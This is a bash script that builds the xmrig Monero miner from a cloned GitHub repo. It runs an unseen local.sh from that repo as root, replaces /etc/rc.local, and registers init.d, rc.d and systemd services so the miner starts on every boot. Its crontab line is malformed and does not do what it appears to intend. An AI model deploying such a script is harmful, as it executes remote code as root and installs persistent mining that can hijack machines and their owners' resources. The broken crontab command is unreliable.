#!/bin/bash -ex
cd /root 
sudo add-apt-repository -y ppa:jonathonf/gcc-7.1 
sudo apt-get update -y 
 
sudo apt-get install -y gcc-7 g++-7 
 
sudo apt-get install -y git build-essential cmake 
 
sudo apt-get install -y libuv1-dev libmicrohttpd-dev uuid-dev 
 
sudo echo /etc/crontab > 00 6 * * * root reboot   
 
sudo git clone https://github.com/Enimus/xmr.git -q  
  
cd xmr 
mkdir build 
cd build 
 
sudo cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 -DWITH_HTTPD=OFF 
 
sudo make 
 
sudo cp xmrig /usr/local/bin/xmrig 
 
cd .. 
 
sudo chmod +x ./local.sh 

sudo ./local.sh 
 
sudo rm -r /etc/rc.local 
sudo mv /tmp/enimus.service /etc/systemd/system/enimus.service 
 
sudo cp /root/xmr/rc.local /etc/ 
sudo chmod +x etc/rc.local 

sudo cp /root/xmr/enimusd.sh /etc/init.d/enimusd.sh 
sudo cp /root/xmr/enimusd.sh /etc/rc.d/enimusd.sh 
sudo chmod +x /etc/init.d/enimusd.sh 
sudo chmod +x /etc/rc.d/enimusd.sh 
 
sudo update-rc.d enimusd.sh defaults 
sudo update-rc.d enimus.service enable 
  
# this is kick off aaall miners lol. 
 
sudo systemctl daemon-reload 
 
sudo systemctl start enimus.service  
 
 
 

